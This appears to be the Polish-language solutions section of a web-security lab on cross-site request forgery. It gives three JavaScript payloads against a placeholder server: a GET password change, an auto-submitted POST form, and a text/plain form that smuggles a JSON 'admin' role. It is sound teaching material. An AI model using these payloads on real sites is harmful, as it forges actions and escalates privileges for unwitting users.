<details>
  <summary>Rozwiązania</summary>

  ### Zadanie 1

  ```js
    window.location = '<SERVER>/task1?password=abc12345'
  ```

  ### Zadanie 2

  ```js
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '<SERVER>/task2';

    const input = document.createElement('input');
    input.type = 'text';
    input.name = 'status';
    input.value = 'wykonano';

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();
  ```

  ### Zadanie 3

  ```js
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = '<SERVER>/task3';
  form.enctype = 'text/plain'; 
  
  const input = document.createElement('input');
  input.name = '{"role":"admin"}'; 
  input.value = '';
  
  form.appendChild(input);
  document.body.appendChild(form);

  form.submit();
  ```

</details>
